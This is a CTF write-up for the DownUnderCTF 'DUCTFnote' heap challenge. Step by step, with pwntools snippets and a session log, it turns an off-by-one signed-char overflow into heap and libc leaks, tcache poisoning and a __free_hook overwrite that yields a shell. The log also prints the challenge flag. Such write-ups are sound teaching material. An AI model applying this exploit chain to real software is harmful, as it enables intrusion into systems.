# DownUnderCTF - DUCTFnote (471 points)

DUCTFnote was a heap exploitation challenge.  
The main difficulty was that we could only have one active note at a time, so if we create a new note, the old one is no longer accessible.  

# Source code analysis

I spotted one bug in the [source code](https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/ductfnote.c) which leads to another bug :  
```c
135 void edit_note(datanote_t * note) {
136         if(!note) {
137                 printf("No Note.\n");
138                 return;
139         }
140
141         signed char idx = 0;
142         while(idx <= note->size) { // note->size can takes values from 0 to 127 (0x7f)
143                 *(&(note->data)+idx) = fgetc(stdin);
144                 if (*(&(note->data)+idx) == '\n') {*(&(note->data)+idx) = '\0'; break;}
145                 idx++;
146         }
147 }
```
In the function `edit_note` the condition of the while is incorrect and the loop is executed once too often : `while(idx <= note->size)` should have been `while(idx < note->size)`.  
Thanks to this bug, we can trigger an integer overflow : `idx` is a `signed char`, we know that a `char` takes 1 byte in memory, so a `signed char` can takes values from -128 to 127, if `note->size` equals 127, then `idx++` will trigger the integer overflow and `idx` will have the value -128, it allows us to write data from `&note->data - 128` to `&note->data + 127` (ie before `note->data`).  


# Overwriting `param->maxsize`

Using these bugs, we can overwrite `param->maxsize` with `0xffffffff` :
```py
# set maxsize to 0xffffffff (max value on 4 bytes) -> integer overflow in create_note allows us to     malloc small chunks
create_note(127)
edit_note(b"A"*127 + b"B"*85 + p64(0x21) + p32(0xffffffff))
```

It allows us to malloc any size and even small size :  
```c
109 datanote_t * create_note(unsigned int size, param_t *params) {
110         if (size > params->maxsize) {
111                 printf("Note too big.\n");
112                 return 0;
113         }
114         int allocsize = size | 0x80;
115         datanote_t * note = (datanote_t*)malloc(allocsize + 8);
116         note->size = size;
117         return note;
118 }
```
We will always skip the `if` as we overwrote `param->maxsize` with the maximal value for an int.  

Now, what happen if we pass a size of `0xffffffff` ? :

- we skip the `if` because `0xffffffff > 0xffffffff` is not true
- `0xffffffff | 0x80 == 0xffffffff`
- `0xffffffff + 8 == 0x7` integer overflow :) , so it calls `malloc(0x7)`
- `note->size = 0xffffffff`

This will be useful later.


# Leaking heap base address
Let's take a look at `show_note` :  
```c
121 void show_note(datanote_t * note) {
122         if(!note) {
123                 printf("No Note.\n");
124                 return;
125         }
126
127         printf("<------------ NOTE 1 ------------>\n");
128         fwrite(&(note->data), note->size, 1, stdout);
129         printf("\n");
130         printf("<-------------------------------->\n");
131         printf("\n");
132 }
```

With the out-of-bounds write, we can overwrite `note->size`, moreover `fwrite` doesn't care of null bytes so we can leak some data placed after `note->data`.  
```py
info("leaking heap address...")
create_note(0)

create_note(127)
delete_note()

create_note(0)
delete_note()
# this free'd chunk now contains a heap pointer
```

We are in this situation :  
```
┌──────────────────────────────────────────────────┐
│        note (size : 0)                           │
├──────────────────────────────────────────────────┤
│ free'd note (size : 127)                         │
├──────────────────────────────────────────────────┤
│ free'd note (size : 0) (contains a heap pointer) │
└──────────────────────────────────────────────────┘
```

We now have to create a new note of size 127 and overwite its `note->size` with a higher value :  
```py
create_note(127)
# 0x111 : chunk size
# 0x1000 : note->size
edit_note(b"A"*127 + b"B"*117 + p64(0x111) + p32(0x1000) + p32(0xdead))
```

We now have this :  
```
┌──────────────────────────────────────────────────┐
│  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  │
├──────────────────────────────────────────────────┤
│ active note (size : 0x1000)                      │
├──────────────────────────────────────────────────┤
│ free'd note (size : 0) (contains a heap pointer) │
└──────────────────────────────────────────────────┘
```
We juste have have to call `show_note` to get our heap pointer :  
```py
heap_base = u64(show_note()[0x114:0x114+8]) - 0x10
success(f"heap base @ {hex(heap_base)}")
```


# Leaking libc base address
To get a libc address, we have to free a chunk that will end up in unsorted bin.  
So the idea is to create a large fake chunk of size 0x500 (large enough to not fit in a tcache bin), add padding to avoid `double free or corruption (!prev)` error caused by the lack of the `PREV_INUSE` bit in the next chunk, and then free this large chunk, malloc will let a libc pointer.

```py
info("leaking libc address...")
# will be used to leak data
create_note(0x200)
delete_note()

# its size will be changed with 0x500
create_note(127)
delete_note()

# padding to pass security checks (PREV_INUSE for next chunk)
create_note(0x80)
# add 2 entries in tcache bin 0x100 - will be useful for write-what-where
for _ in range(2):
    create_note(0x80)
    edit_note(b"A"*127 + b"B"*117 + p64(0x101))
    delete_note()

for _ in range(4):
    create_note(0x80)
create_note(0x91) # chunk with note->size=0x91, so if we interpret this value as a chunk size which have PREV_INUSE at the right place to pass security checks

create_note(127)
# modify chunk size with 0x501, because it will not fit in tcache bins
# so once free'd, the chunk will be in unsorted bin
edit_note(b"A"*127 + b"B"*117 + p64(0x501))
delete_note()

create_note(0x200)
edit_note(b"A"*127 + b"B"*117 + p64(0x291) + p32(0x1000))
libc_base = u64(show_note()[0x28c:0x28c+8]) - 0x1ebbe0
success(f"libc base @ {hex(libc_base)}")

# malloc will use in priority unsorted bin instead of creating new chunks from top chunk
```

The chunk in unsorted bin will be used to create other smaller chunks that will overlap already existing chunks, that's why we placed two chunks in tcache bin. It will allows us to overwrite pointers from a free'd chunk and make malloc returns us an arbitrary pointer.

# Overwriting `__free_hook` with `system`

Now that we have overlapping chunks, it remains for us to allocate the right amount of data and overwrite the pointers of the free'd chunks placed in tcache bin in order to make malloc returns us an arbitrary pointer and get a write-what-where primitive.

```py
info("overwriting __free_hook with system...")
target = libc_base + libc.symbols["__free_hook"] - 8

attach_gdb()
create_note(0x2c0)
edit_note(b"A"*127 + b"B"*117 + p64(0x2d1) + p64(target) + p64(target))

create_note(0xf0)
create_note(0xf0) # addr of target
attach_gdb()
edit_note(b"JUNK" + p64(libc_base + libc.symbols["system"]))
```

With the write-what-where primitive, we overwrote `__free_hook` with `system`.

# Getting a shell

We now have to free a chunk which contains `/bin/sh` at the beginning (I used the out-of-bounds write for that).

```py
create_note(127)
edit_note(b"A"*127 + b"B"*117 + p64(0xdead) + b"/bin/sh")
delete_note()
```

The complete exploit is available here : [https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/exploit.py](https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/exploit.py)

```
[+] Opening connection to pwn-2021.duc.tf on port 31917: Done
[*] leaking libc address...
[+] libc base @ 0x7f201d1c4000
[*] leaking heap address...
[+] heap base @ 0x55e7f2322000
[*] overwriting __free_hook with system...
[*] Switching to interactive mode

$ id
uid=1000 gid=1000 groups=1000
$ ls -la
total 2204
drwxr-xr-x 1 65534 65534    4096 Sep 17 12:29 .
drwxrwxrwt 7  1000  1000     140 Sep 29 18:04 ..
-rw-r--r-- 1 65534 65534      42 Sep 17 11:24 flag.txt
-rwxr-xr-x 1 65534 65534  191472 Sep 17 11:24 ld-2.31.so
-rwxr-xr-x 1 65534 65534 2029224 Sep 17 11:24 libc.so.6
-rwxr-xr-x 1 65534 65534   21832 Sep 17 12:29 pwn
$ cat flag.txt
DUCTF{n0w_you_4r3_r34dy_f0r_r34l_m$_0d4y}
```

---

Thanks to grub and DownUnderCTF team for this cool heap challenge and nice ctf :)
